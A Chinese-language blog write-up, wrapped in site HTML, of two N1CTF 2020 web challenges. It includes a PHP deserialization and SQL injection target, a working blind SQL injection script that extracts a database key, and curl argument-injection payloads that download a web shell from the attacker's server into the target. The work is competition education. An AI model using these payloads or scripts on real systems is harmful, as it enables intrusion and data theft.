@@ -1,0 +1,598 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>N1CTF 2020 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="N1CTF 2020">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-17 15:14" pubdate>
+        2020年10月17日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      898 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">N1CTF 2020</h1>
+            
+            <div class="markdown-body">
+              <h2 id="web-SignIn"><a href="#web-SignIn" class="headerlink" title="web SignIn"></a>web SignIn</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ip</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span>&#123;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;
+            <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-keyword">$this</span>-&gt;waf(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;ip =<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];
+        &#125;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-variable">$con</span>=mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;********&quot;</span>,<span class="hljs-string">&quot;n1ctf_websign&quot;</span>);
+        <span class="hljs-variable">$sqlquery</span>=sprintf(<span class="hljs-string">&quot;INSERT into n1ip(`ip`,`time`) VALUES (&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;waf(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]),time());
+        <span class="hljs-keyword">if</span>(!mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sqlquery</span>))&#123;
+            <span class="hljs-keyword">return</span> mysqli_error(<span class="hljs-variable">$con</span>);
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;your ip looks ok!&quot;</span>;
+        &#125;
+        mysqli_close(<span class="hljs-variable">$con</span>);
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>) </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-variable">$ip</span>;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>)</span>&#123;
+    	<span class="hljs-keyword">if</span>(md5(<span class="hljs-keyword">$this</span>-&gt;check)===md5(<span class="hljs-string">&quot;key****************&quot;</span>))&#123;
+    		readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>);
+    	&#125;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;ip;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">if</span>(stristr(<span class="hljs-keyword">$this</span>-&gt;ip, <span class="hljs-string">&quot;n1ctf&quot;</span>)!==<span class="hljs-literal">False</span>)
+            <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-string">&quot;welcome to n1ctf2020&quot;</span>;
+        <span class="hljs-keyword">else</span>
+            <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-string">&quot;noip&quot;</span>;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;getflag();
+    &#125;
+
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>]))&#123;
+    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>];
+	unserialize(<span class="hljs-variable">$input</span>);
+&#125; 
+  
+
+</code></pre>
+
+<p>get一个新知识点,触发ip的__toString如果有return值会返回到现在的语句中，比如运行下面这个会输出n1ctf</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ip</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;n1ctf&quot;</span>;
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>) </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-variable">$ip</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">echo</span>(<span class="hljs-keyword">$this</span>-&gt;ip.<span class="hljs-string">&quot;\n&quot;</span>);
+        var_dump(<span class="hljs-keyword">$this</span>-&gt;ip);
+    &#125;
+&#125;
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> flag(<span class="hljs-keyword">new</span> ip);
+unserialize(serialize(<span class="hljs-variable">$a</span>));</code></pre>
+
+<p>然后就是写脚本盲注</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> string
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])
+
+url = <span class="hljs-string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:1:&#123;s:2:%22ip%22;N;&#125;s:5:%22check%22;N;&#125;&#x27;</span>
+
+<span class="hljs-comment"># print(requests.post(url,data=payload).text)</span>
+x=<span class="hljs-string">&quot;&quot;</span>
+database=<span class="hljs-string">&quot;database()&quot;</span><span class="hljs-comment">#sql</span>
+table =<span class="hljs-string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema regexp database())&quot;</span>
+
+column=<span class="hljs-string">&quot;(select group_concat(column_name) from information_schema.columns where table_name=&#123;&#125; and table_schema=database())&quot;</span>.<span class="hljs-built_in">format</span>(str_to_hex(<span class="hljs-string">&#x27;n1key&#x27;</span>))
+data = <span class="hljs-string">&quot;(select `key` from n1key)&quot;</span>
+zfc = string.printable
+
+<span class="hljs-keyword">for</span> Len <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span>
+    <span class="hljs-built_in">min</span> = <span class="hljs-number">33</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-built_in">max</span> &gt;= <span class="hljs-built_in">min</span>:
+        mid = (<span class="hljs-built_in">max</span> + <span class="hljs-built_in">min</span>) // <span class="hljs-number">2</span>
+        header = &#123;<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;1&#x27;and 1=(if((select ascii(substr(&#123;&#125;,&#123;&#125;,1))&gt;&#123;&#125;),1,0)) and exp(~&#x27;n1ctf&#x27;) and &#x27;1&quot;</span>.<span class="hljs-built_in">format</span>(data,Len,mid)&#125;
+        <span class="hljs-comment"># print(header)</span>
+        r = requests.post(url,headers=header)
+        <span class="hljs-comment"># print(r.text)</span>
+        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;&lt;code&gt;welcome to n1ctf2020&lt;/code&gt;&lt;/pre&gt;&quot;</span>  <span class="hljs-keyword">in</span> r.text):
+            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-built_in">max</span> = mid
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">max</span> == mid == <span class="hljs-built_in">min</span>:
+            x += <span class="hljs-built_in">chr</span>(mid)
+            print(x)
+            <span class="hljs-keyword">break</span>
+</code></pre>
+
+
+
+<h2 id="DockerManager"><a href="#DockerManager" class="headerlink" title="DockerManager"></a>DockerManager</h2><p>题目给了附件，漏洞点在 view.php</p>
+<pre><code class="hljs dockerfile">$<span class="hljs-keyword">cmd</span><span class="bash"> = <span class="hljs-string">&#x27;curl --connect-timeout 10 &#x27;</span> . <span class="hljs-variable">$host_addr</span> . <span class="hljs-string">&#x27; -g &#x27;</span> . <span class="hljs-variable">$cert</span> . <span class="hljs-variable">$key</span> . <span class="hljs-variable">$cacert</span>;</span></code></pre>
+
+<p>由于php版本00截断可以控制$host_addr可以用来加参数</p>
+<p>利用curl -K</p>
+<pre><code class="hljs mathematica"><span class="hljs-operator">-</span><span class="hljs-built_in">K</span>     指定配置文件
+我们可以在配置文件中定义好要请求的<span class="hljs-built_in">URL</span>。保存路径。<span class="hljs-variable">HTTP</span>头这些配置
+然后<span class="hljs-variable">curl</span> <span class="hljs-operator">-</span><span class="hljs-built_in">K</span>文件名。<span class="hljs-variable">curl</span>就会根据配置项中的值来进行请求
+
+例如
+<span class="hljs-variable">option</span>文件如下
+<span class="hljs-built_in">URL</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;http://119.45.155.77/&quot;</span>
+<span class="hljs-variable">output</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;index.html&quot;</span>
+
+<span class="hljs-variable">curl</span> <span class="hljs-operator">-</span><span class="hljs-variable">Koption</span>
+那么<span class="hljs-variable">curl</span>就会访问<span class="hljs-variable">http</span><span class="hljs-operator">://</span><span class="hljs-number">119.45</span><span class="hljs-number">.155</span><span class="hljs-number">.77</span><span class="hljs-operator">/</span>然后输出到<span class="hljs-variable">index</span><span class="hljs-operator">.</span><span class="hljs-variable">html</span>
+并且。<span class="hljs-variable">option</span>文件中可以有其他杂乱的数据。只要配置项那部分格式正确就行</code></pre>
+
+<p>现在要创一个配置文件来上马，可以利用/proc/&lt;pid&gt;/cmdline ，这个文件可以存正在运行的进程的启动命令。curl -K读取/dev/urandom 会造成curl一直在运行，同时加上我们想要的配置文件，就可以生成在对应的文件/proc/&lt;pid&gt;/cmdline（&lt;pid&gt;未知）</p>
+<pre><code class="hljs llvm">/view.php
+POST
+host<span class="hljs-operator">=</span>-K/dev/urandom<span class="hljs-variable">%00</span>&amp;cacert<span class="hljs-operator">=</span><span class="hljs-number">111</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>aurl<span class="hljs-operator">=</span>”你服务器上马”<span class="hljs-variable">%0</span>aoutput<span class="hljs-operator">=</span>”img/shell.php”<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>a</code></pre>
+
+<p>然后爆破fd，执行-k就可以写入shell</p>
+<pre><code class="hljs awk">/view.php
+POST
+host=-K<span class="hljs-regexp">/dev/u</span>random%<span class="hljs-number">00</span>host=-K<span class="hljs-regexp">/proc/</span>§<span class="hljs-number">1</span>§/cmdline%<span class="hljs-number">00</span></code></pre>
+
+
+
+<p>连上马后 trap “” 14 &amp;&amp; /readflag   算数学题</p>
+<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6750.html">https://www.zhaoj.in/read-6750.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/E7S2ehXp7/">https://guokeya.github.io/post/E7S2ehXp7/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/N1CTF/">N1CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/27/ByteCTF2020/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ByteCTF2020</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
+                        <span class="hidden-mobile">西湖论剑</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
